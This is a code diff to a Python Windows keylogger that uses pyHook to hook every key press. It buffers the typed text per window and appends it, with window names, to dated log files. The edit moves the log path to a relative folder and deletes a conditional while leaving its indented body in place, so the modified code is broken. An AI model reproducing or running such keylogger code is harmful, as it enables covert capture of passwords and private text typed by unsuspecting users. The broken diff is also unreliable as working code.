@@ -13,14 +13,14 @@ import pythoncom
 from datetime import datetime
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = 'D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\' + todays_date + '.txt'
+file_name = './logs/' + todays_date + '.txt'
 
 line_buffer = ""  # current typed line before return character
 window_name = ""  # current window
 
 
 def SaveLineToFile(line):
-    todays_file = open(file_name, 'a')  # open todays file (append mode)
+    todays_file = open(file_name, 'a+')  # open todays file (append mode)
     todays_file.write(line)  # append line to file
     todays_file.close()  # close todays file
 
@@ -31,17 +31,15 @@ def OnKeyboardEvent(event):
 
     # print 'Ascii:', event.Ascii, chr(event.Ascii) #pressed value
 
-    """if typing in new window"""
-    if(window_name != event.WindowName):  # if typing in new window
         if(line_buffer != ""):  # if line buffer is not empty
             line_buffer += '\n'
             # print to file: any non printed characters from old window
             SaveLineToFile(line_buffer)
 
-        line_buffer = ""  # clear the line buffer
-        # print to file: the new window name
-        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n')
-        window_name = event.WindowName  # set the new window name
+            line_buffer = ""  # clear the line buffer
+            # print to file: the new window name
+            SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n')
+            window_name = event.WindowName  # set the new window name
 
     """if return or tab key pressed"""
     if(event.Ascii == 13 or event.Ascii == 9):  # return key
@@ -65,6 +63,7 @@ def OnKeyboardEvent(event):
         line_buffer += chr(event.Ascii)  # add pressed character to line buffer
 
     return True  # pass event to other handlers
+
 
 hooks_manager = pyHook.HookManager()  # create hook manager
 hooks_manager.KeyDown = OnKeyboardEvent  # watch for key press
